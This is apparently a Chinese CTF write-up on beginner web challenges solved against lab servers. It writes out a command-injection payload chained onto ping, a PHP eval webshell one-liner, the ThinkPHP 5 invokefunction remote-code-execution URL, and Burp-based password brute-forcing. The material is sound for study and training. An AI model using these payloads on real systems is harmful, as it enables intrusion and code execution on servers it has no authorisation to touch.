# get_post
- 这题要求使用http协议中GET和POST方法传递参数
- GET方法我们直接在请求体后面加上`?a=1`即可
- 但是POST方法很难，chrome上的POST方法极为复杂，但是很具有学习价值（日后有待学习）
- 简单点的方法：使用firefox的hackbar插件
- 因为新版本的hackbar要收费，所以找了个替代品，但其实都一样的
- 首先先load url
- 然后勾选`Post data`，输入`b=2`后，点击`execuse`执行即可

# robots
- robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件
- 写入了robot协议后，就不可以被搜索引擎获取屏蔽的内容
- 这里我们可以尝试访问`http://220.249.52.133:54658/robots.txt`
- 出现了这样的内容：
```
User-agent: *
Disallow: 
Disallow: f1ag_1s_h3re.php
```
- 那结果很显然了，flag在`http://220.249.52.133:54658/f1ag_1s_h3re.php`里面

# backup
- 如果网站存在备份文件，常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf” 尝试在URL后面，依次输入常见的文件备份扩展名。
- 输入`index.php.bak`时下载文件，记事本打开后得到flag


# cookie
- 菜鸟教程里介绍了何为cookie
 - Cookie 是一些数据, 存储于你电脑上的文本文件中。

 - 当 web 服务器向浏览器发送 web 页面时，在连接关闭后，服务端不会记录用户的信息。

 - Cookie 的作用就是用于解决 "如何记录客户端的用户信息"

- 同时，也介绍了通过JavaScript的`document.cookie`方法可以查询cookie
- 我们知道，浏览器的console是可以跑JS的
- 跑一下`document.cookie`，得到`look-here=cookie.php`
- 访问`http://220.249.52.133:39021/cookie.php`，网页显示See the http response
- 在F12的Network，点击cookie.php，找到flag

# 一个不能按的按钮
- 太简单了，改一下源码就行

# weak_auth
- 这是一个burpsuite的简单入门题
- 打开网页，随便输一个username和password，会提示你使用`admin`登录
- 但是我们不知道密码是什么
- check.php里面有一行注释提示我们使用字典，又联想到这里使用的是弱密码，所以我们使用弱密码的字典，把密码给试出来
- 原理就是通过burpsuit对目标网站进行遍历攻击，得到`Response`，通过找到正确的`Response`来得到flag

## burpsuite的初始配置
- 首先我们要开启Internet代理，使得Burpsuite可以抓到包
- 我们设置`127.0.0.1 Port:8080`这是本地机子的IP
- 在Burpsuite中，我们在`Proxy-Options`中设置IP，这里是默认的

## 使用Intruder进行爆破
- OK，现在我们尝试输入admin登录
- Burpsuite会抓到一个数据包，这个时候浏览器会卡住
- 抓到这个包后，我们将它`Action-Send to Intruder`，然后我们将会根据这个包，使用Intruder对这个站点进行遍历攻击
- 打开`Intruder`
 1. 检查Target(记住不要点下面那个Use Https，否则会很慢)；
 2. 检查Positions，设置爆破点在password
 3. 设置Payloads，在payload options处载入字典
 4. 开始攻击
- 然后我们就会得到攻击后回应数据的长度
- 有很多长度434的，那么这些都是错的，我们找一个不一样的就好
- 找到一个长度437的，对应密码123456，点进去，查看Response，得到flag

# command_execution
- 这题是Linux系统指令的考察
- 首先我们先试试`127.0.0.1`的PING
```
ping -c 3 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.062 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.054 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.032 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.032/0.049/0.062/0.013 ms
```
- 其实就可以得知，这里是利用了Linux的PING
- 那么我们就可以找服务器里面的文件了
- 使用`find`和正则表达式
```
127.0.0.1 && find /home -name flag*
```
```
ping -c 3 127.0.0.1 && find /home -name flag*
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.053 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.047 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.040 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.040/0.046/0.053/0.009 ms
/home/flag.txt
```
- 刚好找到home目录下有个`flag.txt`
- 使用`cat`访问它
```
127.0.0.1 && cat /home/flag.txt
```
```
ping -c 3 127.0.0.1 && cat /home/flag.txt
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.039 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.060 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.048 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.039/0.049/0.060/0.008 ms
cyberpeace{237373217fef1e22d6dcd8e3f2202455}
```
- 找到flag


# simple_php
```php
<?php
show_source(__FILE__);
include("config.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
if($a==0 and $a){
    echo $flag1;
}
if(is_numeric($b)){
    exit();
}
if($b>1234){
    echo $flag2;
}
?>
```
- 确实很简单，不会的`is_numeric`查一下就知道是用来判断变量是否为数字或者数字字符串的
- ok，我们来试试`http://220.249.52.133:40468/?a=0`,网页打开后是空白的，说明`if($a==0 and $a)`出了问题，没执行代码块
- ok，换个思路，使用16进制`http://220.249.52.133:40468/?a=0x00`,得到`Cyberpeace{647E37C7627CC3E401`，很显然只有一半，另一半在b手中
- 但现在有个问题，要怎么绕过`is_numeric`的检测，使得b>1234呢
- 本来想利用php弱类型的比较使用字符串来实现的，但是查了半天都没有这方面的知识
- 后来查到，使用数组可以绕过这个检测；也可以在数字后面加一些字符，比如`b=9999a`
- 输入`http://220.249.52.133:40468/?a=0x00&b[]=4321`,注意这里两个赋值之间使用&符号链接起来，得到flag

# xff_referer
- 操作比较简单，但是需要先了解`xff`和`referer`的基本内容
- 首先，xff和referer都是header里面的内容
- xff：https://www.jianshu.com/p/15f3498a7fad
- referer：http://www.ruanyifeng.com/blog/2019/06/http-referer.html
- 简单来说，xff就是来源，一般来说，指的是<font color=#FF0033>最初发起请求的客户端的IP地址</font>
- referer指的是<font color=#FF0033>引荐人</font>

## 利用burpsuite截包伪造

### 截包
- 开代理`127.0.0.1`

### 伪造
- 抓包将包添加至`Repeater`
- 根据题目提示<font color=#FF0033>一定要来自123.123.123.123</font>在`Request`中加上一行`X-Forwarded-For:123.123.123.123`
- send之后，看到Response中有一行`document.getElementById("demo").innerHTML="□□□□https://www.google.com`
- 把内容复制到支持UTF-8的文本编辑器中可以看到是<font color=#FF0033>必须来自https://www.google.com</font>
- 那么这里就是在暗示伪造的referer为：`htttps://www.google.com`
- 再在Request中添加一行`Referer:https://www.google.com`
- 得到flag

# webshell
- 初步认识了什么叫后门，木马的植入方式之一
- 首先，了解一下` <?php @eval($_POST['shell']);?>`的原理
 - 以POST方式传递shell参数，通过eval()函数执行代码，`@`为不报错的符号
- 那么这就是后门啦，同时一些木马也可以根据这个原理进行植入
- ok，我们第一个想法就是康康有没有`$flag`
- 试试`shell=echo $flag;`，没有反应
- 又试了`$password`,`$_flag`，都没有反应
- 试了试
```php
if(isset($flag)){
    echo 'isset';
}
else{
    echo 'not';
}
```
- 结果都是not
- 后来查到资料，php是可以类似于linux使用`system()`来执行系统命令的
- 我们这次尝试输入`shell=system('ls');`
- 得到
```
flag.txt index.php <?php @eval($_POST['shell']);?> 
```
- 答案很显然了，直接访问`http://220.249.52.133:59137/flag.txt`,得到flag


# simple_js
- 要读懂JS代码哦
- 进去看代码感觉是那种你怎么输都不会对的
- 所以关键在后面那串16进制里面
- 使用在线工具将16进制转换为10进制，再转成ASCII，最后在python中拼接
- 也可以在火狐浏览器控制台中： 

```
console.log("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30") 
```

- 得到：55,56,54,79,115,69,114,116,107,49,50 

```
String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50); 
```

- 得到：786OsErtk12

# php_rce
- 这道题是Thinkphp v5的一个getshell的漏洞
- https://learnku.com/articles/21227
- 因为这个漏洞，我们可以尝试传入默认的参数改变参数值来操作shell
- 比如：`http://220.249.52.133:54736/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`
- 或者`http://220.249.52.133:54736/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`
  - (不知为何，所有的wp都是这个操作，但是我做不到)
- 接下来的事情就很容易了，无非就是输入linux指令
- 接下来研究一下这个漏洞的原理
  - ”在修复之前程序未对控制器进行过滤，导致攻击者可以通过引入 \ 符号来调用任意类方法。“
  - 反斜线之后的，会被%name直接当成类名，且被实例化，这样就有可能直接调用类方法
  - 比如：index.php?s=index/\namespace\class/method ，这将会实例化 \namespace\class 类并执行 method 方法。
  - 在thinkphp中，因为有默认值的关系，直接对s进行操作：
     - `http://220.249.52.133:54736/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`
     - 对app实例化，然后执行后面的shellcode

